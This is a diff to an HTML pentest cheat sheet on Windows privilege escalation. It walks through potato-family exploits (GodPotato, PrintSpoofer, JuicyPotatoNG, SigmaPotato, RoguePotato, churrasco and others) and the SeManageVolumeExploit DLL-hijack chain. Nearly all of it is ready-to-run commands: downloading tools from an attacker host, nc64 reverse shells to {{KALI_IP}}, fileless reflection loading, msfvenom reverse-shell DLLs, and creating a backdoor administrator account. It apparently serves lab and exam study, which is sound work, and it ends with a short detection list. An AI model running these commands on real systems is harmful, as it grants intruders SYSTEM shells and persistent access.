@@ -821,70 +821,455 @@ whoami /priv | findstr /i "Se"</div>
       </div>
 
       <div class="info-grid">
-        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">IIS, MSSQL, service accounts, LOCAL SERVICE</div></div>
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">IIS (iis apppool\*), MSSQL (NT SERVICE\MSSQL*), LOCAL SERVICE, NETWORK SERVICE</div></div>
         <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Potato family / PrintSpoofer</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
-        <div class="info-card"><div class="info-label">OS Coverage</div><div class="info-value">All Windows versions (tool varies)</div></div>
+        <div class="info-card"><div class="info-label">OS Coverage</div><div class="info-value">All Windows versions (tool varies by build)</div></div>
       </div>
 
+      <!-- FullPowers step 0 -->
       <div class="section">
-        <div class="section-header">⚡ GodPotato (Best — Works Server 2012–2022)</div>
+        <div class="section-header">&#9888; STEP 0 &mdash; FullPowers (Run FIRST if LOCAL/NETWORK SERVICE)</div>
         <div class="section-body">
-          <div class="flow-chain">
-            <div class="flow-node">SeImpersonate</div><div class="flow-arrow">→</div>
-            <div class="flow-node">DCOM/RPC trigger</div><div class="flow-arrow">→</div>
-            <div class="flow-node">SYSTEM token capture</div><div class="flow-arrow">→</div>
-            <div class="flow-node">CreateProcessAsUser</div><div class="flow-arrow">→</div>
-            <div class="flow-node">🎯 SYSTEM shell</div>
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>LOCAL SERVICE / NETWORK SERVICE</strong> accounts have SeImpersonatePrivilege <em>stripped</em> at runtime by the SCM. Run FullPowers first to recover SeImpersonate + SeAssignPrimaryToken before running any potato.</span>
           </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Transfer GodPotato</div>
-              <div class="code-block">iwr http://192.168.45.250/GodPotato-NET4.exe -o gp.exe</div>
+              <div class="step-title">Check current context and privileges</div>
+              <div class="code-block">whoami
+whoami /priv</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Transfer FullPowers</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/FullPowers.exe -o {{WPATH}}\FullPowers.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Recover full privilege set</div>
+              <div class="code-block green">REM Interactive -- spawns cmd.exe with full default privileges:
+.\FullPowers.exe
+REM Non-interactive -- run command and exit:
+.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z
+REM Extended privilege set (may fail on NETWORK SERVICE):
+.\FullPowers.exe -x</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-c &lt;CMD&gt;</code> custom command (default: cmd.exe) | <code>-z</code> non-interactive, spawn and exit | <code>-x</code> extended privilege set | <code>-v</code> verbose/debug</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/itm4n/FullPowers" target="_blank">github.com/itm4n/FullPowers</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- POTATO DECISION TREE -->
+      <div class="section">
+        <div class="section-header">&#128506; POTATO DECISION TREE &mdash; Pick the Right Tool</div>
+        <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">Check OS Build</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">Check Spooler</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">Pick Potato</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">&#127919; SYSTEM</div>
+          </div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.9;">
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win XP / Server 2003 (build &lt;6000)</span> &rarr; <span style="color:#a8ff78;">churrasco.exe</span></div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win7 SP1 (7601) / Server 2008 R2 &rarr; Server 2012 R2 (9600)</span> &rarr; <span style="color:#a8ff78;">GodPotato-NET4</span> or <span style="color:#a8ff78;">JuicyPotatoNG</span></div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 (15063&ndash;19041) / Server 2016&ndash;2019 (14393&ndash;17763)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> (best) OR <span style="color:#a8ff78;">PrintSpoofer</span> (Spooler must run)</div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 20H2+ / Server 2019+ (17763+)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> | <span style="color:#a8ff78;">JuicyPotatoNG</span> fallback</div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win11 / Server 2022 (build 22000+)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> OR <span style="color:#a8ff78;">SigmaPotato</span></div>
+            <div style="margin-bottom:6px;"><span style="color:#ffd700;font-weight:bold;">Spooler OFF?</span> &rarr; <span style="color:#a8ff78;">SigmaPotato</span> OR <span style="color:#a8ff78;">SweetPotato -e EfsRpc</span> OR <span style="color:#a8ff78;">SharpEfsPotato</span></div>
+            <div style="margin-bottom:6px;"><span style="color:#ffd700;font-weight:bold;">No outbound?</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> | Avoid RoguePotato (needs socat on Kali)</div>
+            <div style="margin-bottom:6px;"><span style="color:#ffd700;font-weight:bold;">LOCAL/NETWORK SERVICE?</span> &rarr; Run <span style="color:#a8ff78;">FullPowers FIRST</span>, then potato</div>
+          </div>
+          <div class="step">
+            <div class="step-num">!</div>
+            <div class="step-content">
+              <div class="step-title">Check OS build and Spooler status</div>
+              <div class="code-block">systeminfo | findstr /i "OS Version"
+sc query spooler</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">!</div>
+            <div class="step-content">
+              <div class="step-title">Check .NET version (determines GodPotato variant)</div>
+              <div class="code-block">reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s /v Version 2&gt;nul | findstr /i "version"
+REM .NET 4.x -&gt; GodPotato-NET4.exe (try first) | .NET 3.5 -&gt; NET35 | .NET 2.0 -&gt; NET2</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- GodPotato -->
+      <div class="section">
+        <div class="section-header">&#9889; GodPotato &mdash; Best All-Round (Server 2012&ndash;2022, Win8&ndash;11)</div>
+        <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">SeImpersonate</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">RPC/DCOM trigger</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">SYSTEM token</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">CreateProcessAsUser</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">&#127919; SYSTEM shell</div>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer GodPotato &mdash; select correct .NET variant</div>
+              <div class="code-block purple">REM NET4 -- try this first:
+iwr http://{{KALI_IP}}/GodPotato-NET4.exe -o {{WPATH}}\gp.exe
+REM NET35 fallback:
+iwr http://{{KALI_IP}}/GodPotato-NET35.exe -o {{WPATH}}\gp.exe
+REM NET2 for very old targets:
+iwr http://{{KALI_IP}}/GodPotato-NET2.exe -o {{WPATH}}\gp.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Verify &mdash; test with whoami</div>
+              <div class="code-block">.\gp.exe -cmd "cmd /c whoami"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Execute &mdash; reverse shell</div>
+              <div class="code-block green">.\gp.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM Optional named pipe override:
+.\gp.exe -cmd "cmd /c whoami" -pipe "mypipe"</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-cmd &lt;command&gt;</code> command to run as SYSTEM (required) | <code>-pipe &lt;name&gt;</code> override named pipe (optional). No CLSID selection needed.</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/BeichenDream/GodPotato" target="_blank">github.com/BeichenDream/GodPotato</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- PrintSpoofer -->
+      <div class="section">
+        <div class="section-header">&#128424; PrintSpoofer &mdash; Win10 / Server 2016/2019 (Spooler must be running)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Confirm Print Spooler is running</div>
+              <div class="code-block">sc query spooler
+REM Must show STATE: RUNNING -- if STOPPED, use GodPotato or SigmaPotato instead</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Transfer PrintSpoofer</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/PrintSpoofer64.exe -o {{WPATH}}\ps.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Execute</div>
+              <div class="code-block green">REM Interactive shell in current console:
+.\ps.exe -i -c cmd
+REM Spawn on desktop session ID (GUI session):
+.\ps.exe -d 1 -c cmd
+REM Non-interactive reverse shell:
+.\ps.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-c &lt;CMD&gt;</code> command to execute (required) | <code>-i</code> interactive, attach to current console | <code>-d &lt;ID&gt;</code> spawn on desktop session ID. Requires Print Spooler (spoolsv.exe) running.</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/itm4n/PrintSpoofer" target="_blank">github.com/itm4n/PrintSpoofer</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- JuicyPotatoNG -->
+      <div class="section">
+        <div class="section-header">&#129349; JuicyPotatoNG &mdash; Server 2019+ / Win10 20H2+</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer JuicyPotatoNG</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/JuicyPotatoNG.exe -o {{WPATH}}\jp.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Execute &mdash; try both token methods</div>
+              <div class="code-block green">.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM -t * tries CreateProcessWithTokenW AND CreateProcessAsUser
+REM Specify COM port if 10247 is in use:
+.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l {{RPORT}}
+REM Bruteforce CLSIDs if default fails:
+.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -b</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-t &lt;*|t|u&gt;</code> token method (* = try both, required) | <code>-p &lt;program&gt;</code> full path (required) | <code>-a &lt;args&gt;</code> arguments | <code>-l &lt;port&gt;</code> COM listen port (default 10247) | <code>-c &lt;CLSID&gt;</code> override CLSID | <code>-b</code> bruteforce CLSIDs | <code>-i</code> interactive (CreateProcessAsUser only)</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/antonioCoco/JuicyPotatoNG" target="_blank">github.com/antonioCoco/JuicyPotatoNG</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- SigmaPotato -->
+      <div class="section">
+        <div class="section-header">&#128314; SigmaPotato &mdash; Win8&ndash;11 / Server 2012&ndash;2022 (No Spooler needed)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer SigmaPotato</div>
+              <div class="code-block purple">REM Standard .NET4 build (Win8/Server 2012 to Win11/Server 2022):
+iwr http://{{KALI_IP}}/SigmaPotato.exe -o {{WPATH}}\sigma.exe
+REM Core build (needs .NET Framework 3.5; supports PS Core reflection):
+iwr http://{{KALI_IP}}/SigmaPotatoCore.exe -o {{WPATH}}\sigma.exe</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Execute</div>
-              <div class="code-block green">.\gp.exe -cmd "cmd /c whoami"
-.\gp.exe -cmd "cmd /c C:\Users\Public\Documents\nc64.exe 192.168.45.250 4444 -e cmd"</div>
+              <div class="code-block green">REM Run arbitrary command as SYSTEM:
+.\sigma.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM Built-in reverse shell:
+.\sigma.exe --revshell {{KALI_IP}} {{PORT}}</div>
             </div>
           </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">PowerShell .NET reflection (fileless)</div>
+              <div class="code-block green">[Reflection.Assembly]::LoadFile("{{WPATH}}\SigmaPotato.exe")
+[SigmaPotato]::Main("cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd")
+[Reflection.Assembly]::LoadFile("{{WPATH}}\SigmaPotato.exe"); [SigmaPotato]::Main(@("--revshell","{{KALI_IP}}","{{PORT}}"))</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span>No Spooler dependency. Tested Win8&ndash;Win11 and Server 2012&ndash;2022. SigmaPotatoCore.exe required for PS Core / .NET Core reflection (target needs .NET Framework 3.5).</span>
+          </div>
           <div class="alert alert-teal">
-            <span class="alert-icon">🔗</span>
-            <span>GitHub: <a href="https://github.com/BeichenDream/GodPotato" target="_blank">github.com/BeichenDream/GodPotato</a></span>
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank">github.com/tylerdotrar/SigmaPotato</a></span>
           </div>
         </div>
       </div>
 
+      <!-- SweetPotato -->
       <div class="section">
-        <div class="section-header">🖨️ PrintSpoofer (Server 2016/2019, Win10)</div>
+        <div class="section-header">&#127851; SweetPotato &mdash; EfsRpc / DCOM / PrintSpoofer Modes (Win7&ndash;Server 2019)</div>
         <div class="section-body">
-          <div class="code-block green">.\PrintSpoofer.exe -i -c cmd
-.\PrintSpoofer.exe -c "nc64.exe 192.168.45.250 4444 -e cmd"</div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer SweetPotato</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/SweetPotato.exe -o {{WPATH}}\sweet.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Execute &mdash; EfsRpc mode (no Spooler needed)</div>
+              <div class="code-block green">.\sweet.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Other modes</div>
+              <div class="code-block">REM DCOM mode:
+.\sweet.exe -e DCOM -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"
+REM PrintSpoofer mode (default; Spooler required):
+.\sweet.exe -p cmd.exe</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-e &lt;DCOM|WinRM|EfsRpc|PrintSpoofer&gt;</code> exploit mode (default: PrintSpoofer) | <code>-p &lt;prog&gt;</code> program | <code>-a &lt;args&gt;</code> arguments | <code>-c &lt;CLSID&gt;</code> override CLSID | <code>-l &lt;port&gt;</code> COM listen port (default: 6666)</span>
+          </div>
           <div class="alert alert-teal">
-            <span class="alert-icon">🔗</span>
-            <span>GitHub: <a href="https://github.com/itm4n/PrintSpoofer" target="_blank">github.com/itm4n/PrintSpoofer</a></span>
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/CCob/SweetPotato" target="_blank">github.com/CCob/SweetPotato</a></span>
           </div>
         </div>
       </div>
 
+      <!-- SharpEfsPotato -->
       <div class="section">
-        <div class="section-header">🧅 JuicyPotatoNG (Server 2019+)</div>
+        <div class="section-header">&#128273; SharpEfsPotato &mdash; EfsRpc / PetitPotam (No Spooler required)</div>
         <div class="section-body">
-          <div class="code-block">.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c nc64.exe 192.168.45.250 4444 -e cmd"</div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer SharpEfsPotato</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/SharpEfsPotato.exe -o {{WPATH}}\sefsp.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Execute</div>
+              <div class="code-block green">.\sefsp.exe -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"
+.\sefsp.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\Users\Public\w.txt"</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-p &lt;prog&gt;</code> program (default: cmd.exe) | <code>-a &lt;args&gt;</code> arguments. Uses EfsRpcEncryptFileSrv &mdash; no Print Spooler dependency.</span>
+          </div>
           <div class="alert alert-teal">
-            <span class="alert-icon">🔗</span>
-            <span>GitHub: <a href="https://github.com/antonioCoco/JuicyPotatoNG" target="_blank">github.com/antonioCoco/JuicyPotatoNG</a></span>
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/bugch3ck/SharpEfsPotato" target="_blank">github.com/bugch3ck/SharpEfsPotato</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- RoguePotato -->
+      <div class="section">
+        <div class="section-header">&#127744; RoguePotato &mdash; Requires socat Redirector on Kali</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>Requires outbound connectivity from target to Kali port 135.</strong> Needs socat port forwarder on Kali acting as remote OxidResolver. If target cannot reach Kali:135, use GodPotato instead.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Kali &mdash; Start socat redirector (port 135 &rarr; 9999)</div>
+              <div class="code-block purple">sudo socat tcp-listen:135,reuseaddr,fork tcp:{{KALI_IP}}:9999</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Kali &mdash; Start reverse shell listener</div>
+              <div class="code-block purple">nc -lvnp {{PORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Transfer RoguePotato to target</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/RoguePotato.exe -o {{WPATH}}\rogue.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Execute on target</div>
+              <div class="code-block green">.\rogue.exe -r {{KALI_IP}} -l 9999 -e "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM Randomize pipe name (stealth):
+.\rogue.exe -r {{KALI_IP}} -l 9999 -e "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-r &lt;IP&gt;</code> Kali/redirector IP (mandatory) | <code>-e &lt;cmd&gt;</code> command to execute (mandatory) | <code>-l &lt;port&gt;</code> local RogueOxidResolver port (match socat target, e.g. 9999) | <code>-c &lt;CLSID&gt;</code> override | <code>-z</code> randomize pipe name</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/antonioCoco/RoguePotato" target="_blank">github.com/antonioCoco/RoguePotato</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- churrasco -->
+      <div class="section">
+        <div class="section-header">&#127830; churrasco.exe &mdash; Windows XP / Server 2003 (Token Kidnapping)</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span>Legacy only &mdash; use on Windows XP / Server 2003 when modern potatoes fail. Requires NETWORK SERVICE or LOCAL SERVICE context. Kidnaps RPCSS process token.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer churrasco (certutil &mdash; no PowerShell on XP/2003)</div>
+              <div class="code-block purple">certutil -urlcache -f http://{{KALI_IP}}/churrasco.exe {{WPATH}}\churrasco.exe
+certutil -urlcache -f http://{{KALI_IP}}/nc.exe {{WPATH}}\nc.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Execute</div>
+              <div class="code-block green">.\churrasco.exe "{{WPATH}}\nc.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM Add admin user:
+.\churrasco.exe "net user hax0r P@ssw0rd1 /add"
+.\churrasco.exe "net localgroup administrators hax0r /add"</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Usage:</strong> <code>churrasco.exe [-d] "command"</code> &mdash; <code>-d</code> optional debug. Works via RPCSS token kidnapping. Use nc.exe (not nc64.exe) on XP/2003.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- LocalPotato -->
+      <div class="section">
+        <div class="section-header">&#129364; LocalPotato (CVE-2023-21746) &mdash; NTLM Reflection, File Write Primitive</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>Different mechanism &mdash; NOT standard token impersonation.</strong> LocalPotato uses local NTLM reflection for arbitrary file write as SYSTEM. SMB scenario patched Jan 2023 (KB5022282). HTTP/WebDAV variant unpatched as of early 2024. Combine with DLL hijack for code execution.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">SMB mode &mdash; arbitrary file write as SYSTEM (patched, for unpatched targets only)</div>
+              <div class="code-block orange">LocalPotato.exe -i C:\Users\Public\evil.dll -o windows\system32\evil.dll
+REM -i source file | -o destination (no drive letter, relative to C:\)</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">HTTP/WebDAV mode &mdash; unpatched</div>
+              <div class="code-block orange">LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span>Use file write to drop DLL into hijackable path (e.g. StorSvc DLL hijack), then trigger for SYSTEM code execution. See decoder-it/LocalPotato for full chain.</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/decoder-it/LocalPotato" target="_blank">github.com/decoder-it/LocalPotato</a></span>
           </div>
         </div>
       </div>
 
       <div class="detection-box">
-        <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4672 → SYSTEM logon with SeImpersonate • Unusual DCOM/RPC calls from service accounts • Child process spawned from IIS/MSSQL worker → cmd.exe</div>
+        <div class="detection-title">&#128269; Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4672 &rarr; SYSTEM logon with SeImpersonate &bull; Event 4688 &rarr; new process from w3wp.exe/sqlservr.exe &rarr; cmd.exe/powershell.exe &bull; Event 10016 DCOM activation from service accounts &bull; Named pipe creation matching potato patterns &bull; spoolsv.exe spawning unexpected child processes (PrintSpoofer) &bull; Scheduled task creation by service accounts (FullPowers mechanism)</div>
       </div>
     </div>
 
@@ -930,48 +1315,59 @@ whoami /priv | findstr /i "Se"</div>
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Transfer SeManageVolumeExploit.exe from attacker</div>
-              <div class="code-block">iwr http://192.168.45.250/SeManageVolumeExploit.exe -o sme.exe</div>
+              <div class="code-block">iwr http://{{KALI_IP}}/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Run the exploit — grants C:\ full permissions</div>
-              <div class="code-block purple">.\sme.exe</div>
+              <div class="step-title">Run the exploit — grants Everyone:FullControl on C:\</div>
+              <div class="code-block purple">.\SeManageVolumeExploit.exe
+# Output: "Volume DACL overwritten successfully"
+# C:\ root is now writable by all users</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Generate malicious PrintConfig.dll on Kali</div>
-              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=5555 -f dll -o PrintConfig.dll</div>
+              <div class="step-title">Start nc listener on Kali FIRST</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">5</div>
             <div class="step-content">
-              <div class="step-title">Transfer the DLL to target</div>
-              <div class="code-block">iwr http://192.168.45.250/PrintConfig.dll -o C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</div>
+              <div class="step-title">Generate malicious PrintConfig.dll on Kali</div>
+              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll
+# Serve it: python3 -m http.server {{PORT}}</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">6</div>
             <div class="step-content">
-              <div class="step-title">Start listener on Kali</div>
-              <div class="code-block">nc -lvnp 5555</div>
+              <div class="step-title">Drop the DLL to exact PrintNotify path (now writable after step 3)</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">7</div>
             <div class="step-content">
-              <div class="step-title">Trigger PrintNotify service via CLSID (from the screenshots)</div>
+              <div class="step-title">Trigger PrintNotify service via CLSID {854A20FB-2D44-457D-992F-EF13785D2B51}</div>
               <div class="code-block purple">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
-$object = [Activator]::CreateInstance($type)</div>
+$object = [Activator]::CreateInstance($type)
+# Shell arrives on Kali listener as SYSTEM</div>
             </div>
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">⚠️</span>
-            <span>The DLL must be at exactly: <code>C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</code></span>
+            <span>DLL path must be EXACTLY: <code>C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</code> — case-sensitive, no variation.</span>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><strong>Alternative DLL hijack paths</strong> (the C:\ write opens many options):<br>
+            • <code>C:\Windows\System32\wbem\tzres.dll</code> → trigger: run <code>systeminfo</code><br>
+            • <code>C:\Windows\System32\wbem\wbemcomn.dll</code> → trigger: <code>sc restart iphlpsvc</code><br>
+            • <code>C:\Windows\System32\dxgi.dll</code> → trigger: launch any DirectX app</span>
           </div>
         </div>
       </div>
@@ -980,16 +1376,16 @@ $object = [Activator]::CreateInstance($type)</div>
         <div class="section-header">🔗 Resources</div>
         <div class="section-body">
           <ul style="font-family:'Share Tech Mono',monospace;font-size:12px;list-style:none;padding:0;">
-            <li style="margin-bottom:8px;">🔗 <a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank">github.com/CsEnox/SeManageVolumeExploit</a> — Official exploit</li>
-            <li style="margin-bottom:8px;">📝 <a href="https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9" target="_blank">Medium Writeup — Access (PG Practice)</a></li>
-            <li style="margin-bottom:8px;">📝 <a href="https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13" target="_blank">Sliver C2 writeup on Access box</a></li>
+            <li style="margin-bottom:8px;"><a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank" class="alert-teal" style="padding:2px 6px;border-radius:3px;">github.com/CsEnox/SeManageVolumeExploit</a> — Official exploit binary (CsEnox)</li>
+            <li style="margin-bottom:8px;"><a href="https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9" target="_blank">Medium Writeup — Access (PG Practice) — confirmed attack path</a></li>
